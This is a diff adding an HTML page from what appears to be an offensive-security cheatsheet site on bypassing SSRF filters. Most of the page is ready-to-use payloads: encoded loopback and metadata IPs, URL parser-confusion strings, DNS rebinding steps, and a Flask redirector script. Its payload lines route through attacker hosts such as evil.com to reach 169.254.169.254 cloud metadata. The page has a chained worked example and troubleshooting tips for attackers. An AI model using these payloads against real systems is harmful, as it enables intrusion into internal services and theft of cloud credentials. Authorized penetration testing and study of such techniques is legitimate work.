@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Filter bypass · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Filter bypass</h1><p class="cx-lede">Defeating SSRF allowlists and blocklists - IP encodings, DNS tricks, redirect chains, IPv6, URL parser confusion.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1027</span><span class="cx-tag">D3FEND D3-MH, D3-OTF</span><span class="cx-tag">IMPACT InternalAccess</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Most SSRF filters check the URL string against a blocklist (<code>127.0.0.1</code>, <code>localhost</code>, <code>169.254.</code>) or an allowlist of approved domains. The string check is performed <em>before</em> the URL is parsed and resolved - leaving a gap. Exploit one of these:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 127.0.0.1 alternates
+127.1                              # short-form
+0.0.0.0                            # any-interface
+2130706433                         # decimal
+017700000001                       # octal (with leading 0)
+0x7f000001                         # hex
+[::]                               # IPv6 unspecified
+[::ffff:127.0.0.1]                 # IPv4-mapped IPv6
+
+# Domain confusion
+http://example.com@127.0.0.1/      # @ split
+http://127.0.0.1#example.com/      # fragment
+http://127.0.0.1.nip.io/           # DNS resolves to 127.0.0.1
+http://allowed.com.evil.com/       # subdomain trick
+
+# Redirect chains
+http://evil.com/redirect           # → 302 Location: http://127.0.0.1</code></pre></figure>
+<p>Success indicator: the bypass payload reaches an internal service that the original payload couldn't.</p>
+<h2 id="how-filters-fail">How filters fail</h2>
+<p>Two common implementations, both broken:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Blocklist (broken - easily bypassed)
+if &quot;127.0.0.1&quot; in url or &quot;localhost&quot; in url:
+    deny()
+
+# Allowlist (better, often still broken)
+if not url.startswith(&quot;https://api.example.com/&quot;):
+    deny()</code></pre></figure>
+<p>The blocklist misses any encoding that doesn't match the literal string. The allowlist misses URL-parser quirks where the <em>parsed</em> host differs from what <code>startswith()</code> saw.</p>
+<p>The bypass is finding the gap between "what the filter sees" and "what the HTTP library fetches."</p>
+<h2 id="ipv4-alternate-forms">IPv4 alternate forms</h2>
+<p><code>127.0.0.1</code> is an integer - can be written many ways. Most HTTP libraries accept all forms.</p>
+<table>
+<thead>
+<tr>
+<th>Form</th>
+<th>Value</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>127.0.0.1</code></td>
+<td>Standard</td>
+<td>The blocked one</td>
+</tr>
+<tr>
+<td><code>127.1</code></td>
+<td>Short-form</td>
+<td>Skip middle zero octets</td>
+</tr>
+<tr>
+<td><code>127.0.1</code></td>
+<td>Short-form</td>
+<td>Same</td>
+</tr>
+<tr>
+<td><code>2130706433</code></td>
+<td>Decimal</td>
+<td>Single integer</td>
+</tr>
+<tr>
+<td><code>017700000001</code></td>
+<td>Octal</td>
+<td>Leading zero</td>
+</tr>
+<tr>
+<td><code>0x7f000001</code></td>
+<td>Hex</td>
+<td><code>0x</code> prefix</td>
+</tr>
+<tr>
+<td><code>0177.0.0.1</code></td>
+<td>Mixed</td>
+<td>Octal first octet</td>
+</tr>
+<tr>
+<td><code>0x7f.0.0.1</code></td>
+<td>Mixed</td>
+<td>Hex first octet</td>
+</tr>
+<tr>
+<td><code>127.0.0.1.</code></td>
+<td>Trailing dot</td>
+<td>Bypasses some regex</td>
+</tr>
+</tbody>
+</table>
+<p>Generate alternates programmatically:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import socket, struct
+ip = &quot;127.0.0.1&quot;
+packed = socket.inet_aton(ip)
+decimal = struct.unpack(&quot;!I&quot;, packed)[0]
+print(f&quot;Decimal: {decimal}&quot;)              # 2130706433
+print(f&quot;Hex:     0x{decimal:08x}&quot;)        # 0x7f000001
+print(f&quot;Octal:   0{decimal:o}&quot;)           # 017700000001</code></pre></figure>
+<p>The same approach works for any internal IP - <code>169.254.169.254</code> (cloud metadata) becomes <code>2852039166</code> decimal, <code>0xa9fea9fe</code> hex.</p>
+<h2 id="loopback-alternates-beyond-127001">Loopback alternates beyond 127.0.0.1</h2>
+<p>The entire <code>127.0.0.0/8</code> range is loopback on Linux. Every address in that block reaches localhost:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>127.0.0.1
+127.1.1.1
+127.255.255.254</code></pre></figure>
+<p>Filters checking only <code>127.0.0.1</code> literal fail on <code>127.1.2.3</code>. Try a random non-<code>.0.0.1</code> loopback first.</p>
+<p><code>0.0.0.0</code> is the IPv4 "any-interface" address. On Linux it routes to whatever is bound to all interfaces, which usually includes localhost services. Often unfiltered because filters assume "localhost = 127.0.0.1."</p>
+<h2 id="ipv6">IPv6</h2>
+<p>When IPv4 is filtered, IPv6 frequently isn't:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://[::]/                         # unspecified, often resolves to localhost
+http://[::1]/                        # loopback
+http://[0:0:0:0:0:0:0:1]/            # expanded loopback
+http://[::ffff:127.0.0.1]/           # IPv4-mapped IPv6
+http://[::ffff:7f00:0001]/           # same, hex-encoded
+http://[fe80::1]/                    # link-local</code></pre></figure>
+<p>If the application's HTTP library has IPv6 support (most do) and the localhost service binds IPv6 (most do via <code>0.0.0.0</code> translating to <code>::</code>), <code>[::]</code> reaches it.</p>
+<h2 id="dns-based-bypasses">DNS-based bypasses</h2>
+<h3 id="public-dns-pointing-at-internal-ips">Public DNS pointing at internal IPs</h3>
+<p>Services like <a href="https://nip.io">nip.io</a> and <a href="https://sslip.io">sslip.io</a> resolve hostnames to whatever IP is encoded in the name:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>127.0.0.1.nip.io       → resolves to 127.0.0.1
+192.168.1.1.nip.io     → resolves to 192.168.1.1
+metadata.google.internal.nip.io  → can&#x27;t help with this one</code></pre></figure>
+<p>Bypasses string-match filters that block IPs but allow domains. The filter sees <code>nip.io</code>; the resolver returns <code>127.0.0.1</code>.</p>
+<h3 id="your-own-dns-pointing-at-internal-ips">Your own DNS pointing at internal IPs</h3>
+<p>Set up a wildcard A record at a domain you own, pointing to whatever you want:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>*.evil.com  A  127.0.0.1</code></pre></figure>
+<p>Then <code>redis.evil.com</code> resolves to <code>127.0.0.1</code>. Filter sees <code>evil.com</code>; HTTP library connects to <code>127.0.0.1</code>. Works on any allowlist that uses substring matching.</p>
+<h3 id="dns-rebinding-advanced">DNS rebinding (advanced)</h3>
+<p>For filters that resolve the hostname <em>and check the IP against a blocklist</em> but only check once before connecting:</p>
+<div class="cx-steps">
+<ol>
+<li>Set up a DNS server you control with a TTL of 0 for the domain <code>attacker.com</code></li>
+<li>First lookup returns <code>&lt;external IP&gt;</code> - passes the filter check</li>
+<li>Second lookup (the actual fetch) returns <code>127.0.0.1</code> - gets the internal connection</li>
+</ol>
+</div>
+<p>Tools that automate this: <a href="https://rbndr.us">rbndr.us</a>, <a href="https://github.com/nccgroup/singularity">singularity-of-origin</a>.</p>
+<p>DNS rebinding only works against filters that perform a separate resolution-and-check step <em>before</em> fetching. Most modern HTTP libraries cache resolution, so you have at most a few seconds between the check and the fetch.</p>
+<h2 id="url-parser-confusion">URL parser confusion</h2>
+<p>The richest source of bypasses. Different URL parsers disagree on what the "host" of a URL is.</p>
+<h3 id="userinfo-split">Userinfo (<code>@</code>) split</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://example.com@127.0.0.1/</code></pre></figure>
+<p>RFC 3986: the host is <code>127.0.0.1</code>; <code>example.com</code> is the userinfo. Some validators see <code>example.com</code> first and accept; the HTTP library connects to <code>127.0.0.1</code>.</p>
+<h3 id="multiple">Multiple <code>@</code></h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://example.com@evil.com@127.0.0.1/</code></pre></figure>
+<p>Different parsers disagree. Try when single <code>@</code> is filtered.</p>
+<h3 id="fragment">Fragment</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://127.0.0.1/#example.com
+http://127.0.0.1/#@example.com</code></pre></figure>
+<p>Fragment is client-side only - not sent to the server. Useless for redirection but sometimes confuses validators.</p>
+<h3 id="path-as-host">Path-as-host</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://example.com/path?next=http://127.0.0.1</code></pre></figure>
+<p>Validator checks <code>host=example.com</code>, request library follows the embedded URL.</p>
+<h3 id="backslash-as-host-java">Backslash-as-host (Java)</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://example.com\@127.0.0.1/
+http://example.com\.evil.com/</code></pre></figure>
+<p>Java's <code>URL</code> class historically treated <code>\</code> differently from <code>/</code>. Various CVEs exploit this.</p>
+<h3 id="host-header-injection">Host header injection</h3>
+<p>If the SSRF target is a host header rather than a URL, inject directly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Host: 127.0.0.1
+Host: internal.app.local</code></pre></figure>
+<p>Some apps use <code>request.host</code> as the fetch target unconditionally.</p>
+<h2 id="whitelist-subdomain-tricks">Whitelist subdomain tricks</h2>
+<p>When the filter is <code>must contain "example.com"</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://allowed.example.com.evil.com/      # subdomain trick
+http://evil.com/?x=allowed.example.com     # path/query containing the string
+http://example.com.evil.com/               # if &quot;example.com&quot; is anywhere in the host
+http://exampleXcom.evil.com/               # if the dot is part of the check (rare)</code></pre></figure>
+<p>When the filter is <code>must equal "api.example.com"</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://api.example.com.evil.com/           # subdomain hijack
+http://api.example.com@evil.com/           # @ split, see above</code></pre></figure>
+<h2 id="redirect-chains">Redirect chains</h2>
+<p>When the application validates the URL but follows redirects:</p>
+<div class="cx-steps">
+<ol>
+<li><strong>You host a redirector</strong> at <code>http://evil.com/r</code> returning <code>302 Location: http://127.0.0.1/</code>. Quick Flask version:</li>
+</ol>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># redir.py
+from flask import Flask, redirect, request
+app = Flask(__name__)
+@app.route(&quot;/&quot;)
+def r():
+    target = request.args.get(&quot;u&quot;, &quot;http://127.0.0.1/&quot;)
+    return redirect(target, code=302)
+app.run(host=&quot;0.0.0.0&quot;, port=80)</code></pre></figure>
+<ol start="2">
+<li><strong>Submit <code>http://evil.com/r</code></strong> to the SSRF parameter - passes the filter:</li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?url=http://&lt;ATTACKER&gt;/?u=http://169.254.169.254/latest/meta-data/</code></pre></figure>
+<ol start="3">
+<li><strong>Application fetches</strong>, gets the redirect, follows it to <code>127.0.0.1</code>.</li>
+</ol>
+</div>
+<p><code>curl</code> follows redirects only with <code>-L</code>, but most SSL libraries follow by default. Check the application's behavior - if it doesn't follow, redirect won't help.</p>
+<h2 id="encoding-tricks">Encoding tricks</h2>
+<p>Layered URL encoding sometimes confuses validators:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://127.0.0.1                    # plaintext
+http://127%2E0%2E0%2E1              # encoded dots
+http://%31%32%37%2E%30%2E%30%2E%31  # fully encoded
+http://%2531%2532%2537...           # double-encoded</code></pre></figure>
+<p>Useful when the filter URL-decodes once and checks, but the HTTP library decodes again before fetching. Less common than parser-confusion bypasses but worth trying.</p>
+<h2 id="schema-based-bypasses">Schema-based bypasses</h2>
+<p>When <code>http://</code> is filtered but the parser is permissive:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>HTTP://127.0.0.1/                   # uppercase
+http:127.0.0.1/                     # missing slashes (lib-dependent)
+http:/127.0.0.1/                    # one slash
+//127.0.0.1/                        # protocol-relative (sometimes works)</code></pre></figure>
+<p>When schema allowlist is in place (only <code>http(s)://</code>), use a different schema entirely from the <a href="../schemas/index.html">schemas page</a> - <code>gopher://</code>, <code>file://</code>, <code>dict://</code> may be unfiltered.</p>
+<h2 id="putting-it-together">Putting it together</h2>
+<p>A real engagement filter usually combines several checks. The bypass is usually a combination too:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Filter: blocks 127.0.0.1 and 169.254., requires .example.com in URL
+?url=http://attacker.example.com.evil.com:80@2852039166/latest/meta-data/
+
+# Decoded:
+# - Filter sees: contains &quot;.example.com&quot; ✓, no 127.0.0.1, no &quot;169.254.&quot; ✓
+# - Library sees: host = 2852039166 = 169.254.169.254
+# - userinfo &quot;attacker.example.com.evil.com:80&quot; discarded
+# - Result: cloud metadata reached</code></pre></figure>
+<p>The methodology: identify what the filter is checking, then find a representation that passes the check while the HTTP library still connects internally.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>All bypasses return identical "blocked" response.</strong> Filter is checking the <em>resolved IP</em> in the network layer, not the URL string. Library-level workarounds won't help; you need DNS rebinding or no SSRF at all.</li>
+<li><strong><code>@</code> split causes URL parse error.</strong> Some libraries reject userinfo. Try fragment trick or different parser-confusion variant.</li>
+<li><strong>Decimal/hex IPs rejected.</strong> Modern Python <code>urllib</code> and Go <code>net/http</code> reject these. Java and curl accept. Test before relying on the bypass.</li>
+<li><strong>Bypass works for HTTP but not gopher.</strong> Gopher syntax is more rigid; many parser tricks (especially <code>@</code>-split) break gopher URLs. Stick with hostname-only forms (<code>127.1</code>, decimal IP) for gopher.</li>
+<li><strong><code>[::ffff:127.0.0.1]</code> returns "Address family not supported."</strong> Application's HTTP library or OS is IPv4-only. IPv6 bypass tier is unavailable; focus on IPv4 alternates.</li>
+<li><strong>Filter normalizes the URL before checking.</strong> Modern libraries (e.g., recent <code>urllib.parse</code>) canonicalize before validation. Bypass requires either a different library quirk or moving up the stack to redirect chains / DNS rebinding.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>The hierarchy when you hit a filter: try IP alternates first (cheapest), then schema swaps, then parser tricks (<code>@</code>-split, fragment), then external assets you control (DNS, redirector). Save DNS rebinding for last - it's the most reliable but also the most setup.</p>
+<p>Most filter bypass on real engagements is one or two layers, not the full kitchen-sink combo above. If <code>127.1</code> or <code>0.0.0.0</code> works, stop there - extra encoding adds failure points.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../ssti/jinja2/index.html">Previous: Jinja2 (Python - Flask, Django, Ansible)</a><a class="cx-next" href="../../ssti/twig/index.html">Next: Twig (PHP - Symfony, Craft, Drupal 8+)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
